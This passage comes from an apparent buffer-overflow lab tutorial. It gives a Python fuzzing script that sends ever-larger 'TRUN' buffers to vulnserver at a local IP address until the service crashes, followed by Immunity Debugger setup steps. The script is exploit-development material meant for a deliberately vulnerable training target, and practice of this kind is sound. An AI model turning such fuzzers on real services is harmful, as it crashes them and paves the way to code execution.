
Fuzzing is just like spiking, but now that we know that this server is vulnerable to `TRUN` and not `STATS` we will use this python2 script for it :

```python
#!/usr/bin/python
 
import sys, socket
from time import sleep
 
buffer = "A" * 100
 
while True:
    try:
        payload = "TRUN /.:/" + buffer
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.35',9999))
        print ("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
```

The purpose of this script is so far there is connection to our target which is specified with the `ip` and `port` , it will keep sending buffer, we are trying to narrow down where things are breaking and it byte size

- Save your script with `.py` and make sure you have immunity debugger and vulnserver ready
- Also make sure you click the `run` button first on immunity debugger before moving on

![](https://i.imgur.com/80EQ0QI.png)

- Now run your script and notice what is going on

![](https://i.imgur.com/a4kuXNN.png)
